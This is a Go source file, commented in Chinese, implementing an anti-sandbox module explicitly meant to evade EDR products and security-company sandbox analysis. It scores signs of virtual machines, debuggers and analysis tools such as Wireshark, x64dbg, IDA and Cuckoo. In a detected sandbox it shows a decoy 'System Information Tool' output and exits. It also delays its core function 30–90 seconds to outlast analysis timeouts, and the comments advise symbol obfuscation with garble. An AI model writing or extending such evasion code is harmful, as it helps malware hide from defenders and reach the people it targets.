// Package security - 反沙箱与反逆向工程
// O9 终极隐匿：抗二进制取证与 EDR 绞杀
//
// 问题：Go 编译的二进制包含完整的类型信息、函数名和文件路径。
// EDR（CrowdStrike/Defender ATP）会扫描进程行为特征。
// 安全公司的沙箱会自动分析上传的样本。
//
// 解决方案：
//  1. 运行时环境检测：识别沙箱/虚拟机/调试器环境
//  2. 行为伪装：在沙箱中表现为无害的系统工具
//  3. 延迟执行：启动后等待随机时间再初始化核心功能（绕过沙箱超时）
//  4. 编译时混淆：配合 garble 工具抹除所有符号信息
package security

import (
	"crypto/rand"
	"encoding/binary"
	"log"
	"os"
	"runtime"
	"strings"
	"time"
)

// SandboxIndicator 沙箱指标
type SandboxIndicator struct {
	Name     string
	Detected bool
	Weight   int // 权重（0-10），累计超过阈值判定为沙箱
}

// AntiSandbox 反沙箱检测器
type AntiSandbox struct {
	threshold  int // 判定阈值（默认 15）
	indicators []SandboxIndicator
	isSandbox  bool
	decoyMode  bool // 诱饵模式（在沙箱中伪装为无害程序）
}

// NewAntiSandbox 创建反沙箱检测器
func NewAntiSandbox() *AntiSandbox {
	return &AntiSandbox{
		threshold:  15,
		indicators: make([]SandboxIndicator, 0),
	}
}

// Detect 执行全面沙箱检测
// 返回 true = 检测到沙箱环境，应进入诱饵模式
func (as *AntiSandbox) Detect() bool {
	totalWeight := 0

	// 1. CPU 核心数检测（沙箱通常分配 1-2 核）
	cpuCount := runtime.NumCPU()
	if cpuCount <= 2 {
		as.addIndicator("low_cpu_cores", true, 5)
		totalWeight += 5
	}

	// 2. 内存检测（沙箱通常分配 < 4GB）
	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	totalSystemMB := memStats.Sys / (1024 * 1024)
	if totalSystemMB < 512 { // Go 进程可见内存极低
		as.addIndicator("low_memory", true, 4)
		totalWeight += 4
	}

	// 3. 运行时间检测（沙箱通常有 60-120s 超时）
	// 通过检查系统启动时间判断
	if isRecentBoot(5 * time.Minute) {
		as.addIndicator("recent_boot", true, 3)
		totalWeight += 3
	}

	// 4. 虚拟化特征检测
	if detectVirtualization() {
		as.addIndicator("virtualization", true, 3)
		totalWeight += 3
	}

	// 5. 用户交互检测（沙箱无真实用户交互）
	if !hasUserInteraction() {
		as.addIndicator("no_user_interaction", true, 2)
		totalWeight += 2
	}

	// 6. 已知沙箱进程名检测
	if detectSandboxProcesses() {
		as.addIndicator("sandbox_processes", true, 8)
		totalWeight += 8
	}

	// 7. 文件系统特征（沙箱通常有特定路径）
	if detectSandboxFilesystem() {
		as.addIndicator("sandbox_filesystem", true, 6)
		totalWeight += 6
	}

	// 判定
	as.isSandbox = totalWeight >= as.threshold
	if as.isSandbox {
		log.Printf("🎭 [AntiSandbox] 沙箱环境检测: score=%d (threshold=%d)，进入诱饵模式",
			totalWeight, as.threshold)
	}

	return as.isSandbox
}

// EnterDecoyMode 进入诱饵模式（伪装为无害的系统信息工具）
func (as *AntiSandbox) EnterDecoyMode() {
	as.decoyMode = true

	// 输出无害的系统信息（让沙箱分析报告认为这是正常工具）
	log.Println("System Information Tool v2.1.0")
	log.Printf("OS: %s/%s", runtime.GOOS, runtime.GOARCH)
	log.Printf("CPUs: %d", runtime.NumCPU())
	log.Printf("Go Version: %s", runtime.Version())
	log.Println("No issues detected. Exiting.")

	// 静默退出（不执行任何核心功能）
	os.Exit(0)
}

// DelayedStart 延迟启动（绕过沙箱超时机制）
// 沙箱通常只分析前 60-120 秒的行为，之后超时终止
// 随机延迟 30-90 秒后再初始化核心功能
func (as *AntiSandbox) DelayedStart() {
	var buf [4]byte
	rand.Read(buf[:])
	delayMs := 30000 + int(binary.LittleEndian.Uint32(buf[:]))%60000 // 30-90s
	delay := time.Duration(delayMs) * time.Millisecond

	log.Printf("⏳ [AntiSandbox] 延迟启动: %v", delay)
	time.Sleep(delay)
}

// IsDecoyMode 是否处于诱饵模式
func (as *AntiSandbox) IsDecoyMode() bool {
	return as.decoyMode
}

// IsSandbox 是否检测到沙箱
func (as *AntiSandbox) IsSandbox() bool {
	return as.isSandbox
}

// GetIndicators 获取所有检测指标
func (as *AntiSandbox) GetIndicators() []SandboxIndicator {
	return as.indicators
}

// addIndicator 添加检测指标
func (as *AntiSandbox) addIndicator(name string, detected bool, weight int) {
	as.indicators = append(as.indicators, SandboxIndicator{
		Name:     name,
		Detected: detected,
		Weight:   weight,
	})
}

// ═══════════════════════════════════════════════════════════════
// 检测辅助函数
// ═══════════════════════════════════════════════════════════════

// isRecentBoot 检查系统是否刚启动（沙箱特征）
func isRecentBoot(threshold time.Duration) bool {
	// Linux: 读取 /proc/uptime
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return false
	}
	fields := strings.Fields(string(data))
	if len(fields) < 1 {
		return false
	}
	// uptime 格式: "12345.67 ..."（秒）
	// 简单判断：如果 uptime < threshold 则为刚启动
	uptimeStr := fields[0]
	var uptime float64
	for i, c := range uptimeStr {
		if c == '.' {
			// 解析整数部分
			val := 0
			for _, d := range uptimeStr[:i] {
				if d >= '0' && d <= '9' {
					val = val*10 + int(d-'0')
				}
			}
			uptime = float64(val)
			break
		}
	}
	if uptime == 0 {
		return false
	}
	return time.Duration(uptime)*time.Second < threshold
}

// detectVirtualization 检测虚拟化环境
func detectVirtualization() bool {
	// 检查 /sys/class/dmi/id/ 下的虚拟化标识
	vmIndicators := []string{
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
	}

	vmKeywords := []string{
		"vmware", "virtualbox", "kvm", "qemu",
		"xen", "hyper-v", "parallels", "bochs",
	}

	for _, path := range vmIndicators {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		content := strings.ToLower(string(data))
		for _, keyword := range vmKeywords {
			if strings.Contains(content, keyword) {
				return true
			}
		}
	}

	// 检查 /proc/cpuinfo 中的 hypervisor flag
	cpuinfo, err := os.ReadFile("/proc/cpuinfo")
	if err == nil {
		if strings.Contains(string(cpuinfo), "hypervisor") {
			return true
		}
	}

	return false
}

// hasUserInteraction 检测是否有真实用户交互
func hasUserInteraction() bool {
	// 检查是否有 TTY（沙箱通常无 TTY）
	if _, err := os.Stat("/dev/tty"); err != nil {
		return false
	}

	// 检查 DISPLAY 或 WAYLAND_DISPLAY 环境变量
	if os.Getenv("DISPLAY") != "" || os.Getenv("WAYLAND_DISPLAY") != "" {
		return true
	}

	// Windows: 检查 explorer.exe 是否运行
	if runtime.GOOS == "windows" {
		// 简化：检查 USERPROFILE 环境变量
		if os.Getenv("USERPROFILE") != "" {
			return true
		}
	}

	return false
}

// detectSandboxProcesses 检测已知沙箱进程
func detectSandboxProcesses() bool {
	sandboxProcs := []string{
		"vboxservice", "vboxtray", // VirtualBox
		"vmtoolsd", "vmwaretray", // VMware
		"wireshark", "fiddler", // 网络分析
		"procmon", "procexp", // Sysinternals
		"x64dbg", "x32dbg", "ollydbg", // 调试器
		"idaq", "idaq64", // IDA Pro
		"cuckoo", "sandboxie", // 沙箱
	}

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return false
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		// 只检查数字目录
		name := entry.Name()
		isDigit := true
		for _, c := range name {
			if c < '0' || c > '9' {
				isDigit = false
				break
			}
		}
		if !isDigit {
			continue
		}

		commData, err := os.ReadFile("/proc/" + name + "/comm")
		if err != nil {
			continue
		}
		comm := strings.TrimSpace(strings.ToLower(string(commData)))
		for _, proc := range sandboxProcs {
			if comm == proc {
				return true
			}
		}
	}

	return false
}

// detectSandboxFilesystem 检测沙箱文件系统特征
func detectSandboxFilesystem() bool {
	sandboxPaths := []string{
		"/usr/share/virtualbox",
		"/usr/lib/vmware-tools",
		"/.dockerenv",
		"/run/.containerenv",
	}

	for _, path := range sandboxPaths {
		if _, err := os.Stat(path); err == nil {
			return true
		}
	}

	return false
}
